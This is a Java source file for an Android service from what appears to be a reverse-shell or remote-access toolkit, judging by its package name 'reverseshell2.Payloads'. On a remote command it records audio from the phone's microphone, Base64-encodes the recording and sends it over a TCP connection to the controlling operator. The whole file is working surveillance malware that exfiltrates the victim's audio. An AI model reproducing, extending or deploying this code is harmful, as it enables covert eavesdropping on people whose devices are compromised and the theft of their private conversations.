package com.example.reverseshell2.Payloads;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.reverseshell2.MainActivity;
import com.example.reverseshell2.R;
import com.example.reverseshell2.functions;
import com.example.reverseshell2.tcpConnection;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class audioManager extends Service {

    static String TAG = "audioManagerClass";
    static File audiofile = null;
    MediaRecorder mRecorder = null;
    private ExecutorService executor;
    private static final int NOTIFICATION_ID = 4321;

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || intent.getStringExtra("ins") == null) {
            return START_NOT_STICKY;
        }

        String ins = intent.getStringExtra("ins");
        if (ins.equals("startFore")) {
            startRecordingService();
        } else if (ins.equals("stopFore")) {
            stopRecordingService();
        }
        
        return START_STICKY;
    }
    
    private void startRecordingService() {
        // Create notification channel
        new functions(null).createNotiChannel(getApplicationContext());
        
        // Create intent for notification
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
                    PendingIntent.FLAG_IMMUTABLE);
        } else {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        }
        
        // Build foreground notification
        NotificationCompat.Builder notificationBuilder = 
                new NotificationCompat.Builder(getApplicationContext(), "channelid")
                .setContentTitle("Audio Service")
                .setContentText("Recording audio in background")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setOngoing(true);
                
        // For Android 12+, update the notification as per new requirements
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            notificationBuilder
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .setCategory(Notification.CATEGORY_SERVICE);
        }
        
        Notification notification = notificationBuilder.build();
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, notification);
        
        // Begin recording
        startRecording(tcpConnection.out);
    }

    private void stopRecordingService() {
        stopRecording(tcpConnection.out);
    }

    public void startRecording(final OutputStream outputStream) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    File outputDir = getApplicationContext().getCacheDir();
                    audiofile = File.createTempFile("sound", ".mpeg4", outputDir);
                } catch (IOException e) {
                    e.printStackTrace();
                    Log.e(TAG, "external storage access error");
                    sendMessage(outputStream, "Storage access error\n");
                    return;
                }

                if (mRecorder != null) {
                    mRecorder.release();
                }
                
                mRecorder = new MediaRecorder();
                
                try {
                    // Configure MediaRecorder based on Android version
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        // Android 12+ configuration with error handling
                        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                        mRecorder.setAudioChannels(1);
                        mRecorder.setAudioSamplingRate(44100);
                        mRecorder.setAudioEncodingBitRate(128000);
                        mRecorder.setOutputFile(audiofile);
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        // Android 8.0+ configuration
                        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                        mRecorder.setOutputFile(audiofile);
                    } else {
                        // Older Android versions
                        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                        mRecorder.setOutputFile(audiofile.getAbsolutePath());
                        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    }
                    
                    mRecorder.prepare();
                    mRecorder.start();
                    
                    sendMessage(outputStream, "Started Recording Audio\n");
                } catch (IllegalStateException | IOException e) {
                    e.printStackTrace();
                    sendMessage(outputStream, "Error starting audio recording: " + e.getMessage() + "\n");
                    
                    if (mRecorder != null) {
                        mRecorder.release();
                        mRecorder = null;
                    }
                }
            }
        });
    }

    public void stopRecording(final OutputStream outputStream) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                if (mRecorder != null) {
                    try {
                        mRecorder.stop();
                        mRecorder.release();
                        mRecorder = null;
                        
                        if (audiofile != null && audiofile.exists() && audiofile.length() > 0) {
                            sendData(audiofile, outputStream);
                        } else {
                            sendMessage(outputStream, "Error in getting Audio Data\n");
                            stopSelfAndService();
                        }
                    } catch (IllegalStateException e) {
                        e.printStackTrace();
                        sendMessage(outputStream, "Audio Service Error: " + e.getMessage() + "\n");
                        stopSelfAndService();
                    }
                } else {
                    sendMessage(outputStream, "Audio Service Not Started\n");
                    stopSelfAndService();
                }
            }
        });
    }

    private void sendData(final File file, final OutputStream outputStream) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    sendMessage(outputStream, "stopAudio\n");
                    
                    int size = (int) file.length();
                    byte[] data = new byte[size];
                    
                    try (BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file))) {
                        buf.read(data, 0, data.length);
                        
                        String encodedAudio = Base64.encodeToString(data, Base64.DEFAULT);
                        outputStream.write(encodedAudio.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                    } catch (IOException e) {
                        sendMessage(outputStream, "Error sending audio data: " + e.getMessage() + "\n");
                    } finally {
                        if (file.exists()) {
                            file.delete();
                        }
                        stopSelfAndService();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    stopSelfAndService();
                }
            }
        });
    }
    
    private void sendMessage(final OutputStream outputStream, final String message) {
        if (outputStream == null) return;
        
        try {
            outputStream.write(message.getBytes("UTF-8"));
        } catch (IOException e) {
            Log.e(TAG, "Error sending message: " + e.getMessage());
        }
    }
    
    private void stopSelfAndService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE);
        } else {
            stopForeground(true);
        }
        stopSelf();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        if (mRecorder != null) {
            try {
                mRecorder.stop();
            } catch (IllegalStateException e) {
                // Ignore, already stopped
            }
            mRecorder.release();
            mRecorder = null;
        }
        
        if (audiofile != null && audiofile.exists()) {
            audiofile.delete();
        }
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
        
        super.onDestroy();
    }
}
